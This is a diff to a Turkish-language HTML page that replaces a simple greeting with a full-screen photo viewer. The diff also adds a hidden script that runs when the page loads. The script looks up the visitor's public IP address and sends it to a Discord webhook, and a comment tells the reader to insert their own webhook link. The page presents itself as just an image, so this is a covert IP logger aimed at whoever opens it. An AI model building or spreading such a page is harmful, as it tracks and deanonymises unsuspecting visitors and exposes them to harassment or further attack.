@@ -1,10 +1,47 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <title>Merhaba</title>
+  <meta charset="UTF-8" />
+  <title>Fotoğraf Göster</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #000;
+    }
+    img {
+      max-width: 100%;
+      max-height: 100%;
+    }
+  </style>
 </head>
 <body>
-  <h1>Merhaba!</h1>
+  <img src="fotoğraf.png" alt="Görsel" />
+
+  <script>
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+
+        // Kendi Discord Webhook linkini buraya yapıştır
+        const webhookURL = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
+
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            content: `Yeni ziyaretçi IP: ${ip}`
+          })
+        });
+      })
+      .catch(console.error);
+  </script>
 </body>
 </html>
